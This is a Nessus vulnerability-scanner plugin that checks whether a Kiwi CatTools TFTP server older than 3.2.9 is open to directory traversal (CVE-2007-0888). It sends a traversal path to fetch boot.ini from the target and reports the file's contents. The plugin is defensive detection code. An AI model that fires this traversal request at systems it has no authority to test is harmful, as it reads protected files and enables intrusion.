#
# Script Written By Ferdy Riphagen 
# Script distributed under the GNU GPLv2 License.
#

# Changes by Tenable: 
# - re-did the description, raised the risk (1/23/09)
# - Revised plugin title, family change (9/5/09)

include("compat.inc");

if (description) {
 script_id(24747); 
 script_version("$Revision: 1.16 $");
 script_cve_id("CVE-2007-0888");
 script_bugtraq_id(22490);
 script_osvdb_id(33162);

 script_name(english:"Kiwi CatTools < 3.2.9 TFTP Server Traversal Arbitrary File Manipulation");

 script_set_attribute(attribute:"synopsis", value:
"The remote TFTP server is affected by a directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Kiwi CatTools, a freeware
application for device configuration management. 

The TFTP server included with the version of Kiwi CatTools installed
on the remote host fails to sanitize filenames of directory traversal
sequences.  An attacker can exploit this issue to get or put arbitrary
files on the affected host subject to the privileges of the user id
under which the server operates, LOCAL SYSTEM by default." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/459500/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.kiwisyslog.com/kb/idx/5/178/article/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Kiwi CatTools version 3.2.9 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploithub_sku", value:"EH-13-903");
  script_set_attribute(attribute:"exploit_framework_exploithub", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/03/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/02/09");
 script_cvs_date("$Date: 2015/09/24 21:17:11 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_summary(english:"Try to grab a file outside the tftp root");
 script_category(ACT_ATTACK);
 script_family(english:"Misc.");
 script_copyright(english:"This script is Copyright (C) 2007-2015 Ferdy Riphagen");
 script_dependencies("tftpd_detect.nasl", "tftpd_backdoor.nasl");
 script_require_keys("Services/udp/tftp");
 script_exclude_keys('tftp/backdoor');	# Not wise but quicker
 exit(0);
}

include("tftp.inc");

port = get_kb_item("Services/udp/tftp");
if (!port) port = 69;
if (get_kb_item('tftp/'+port+'/backdoor')) exit(0);

get = tftp_get(port:port, path:"z//..//..//..//..//..//boot.ini");
if (isnull(get)) exit(0);
# In case the backdoor was missed by tftpd_backdoor.nasl (UDP is not reliable)
tftp_ms_backdoor(file: 'boot.ini', data: get, port: port);

if (
    ("ECHO" >< get)                || ("SET " >< get)             ||
    ("export" >< get)              || ("EXPORT" >< get)           ||
    ("mode" >< get)                || ("MODE" >< get)             || 
    ("doskey" >< get)              || ("DOSKEY" >< get)           ||
    ("[boot loader]" >< get)       || ("[fonts]" >< get)          ||
    ("[extensions]" >< get)        || ("[mci extensions]" >< get) ||
    ("[files]" >< get)             || ("[Mail]" >< get)           ||
    ("[operating systems]" >< get)
)
{
    report = 
"Here are the contents of the file '\boot.ini' that Nessus
was able to read from the remote host :
" + get;
    security_hole(port:port, protocol:"udp", extra:report);
}

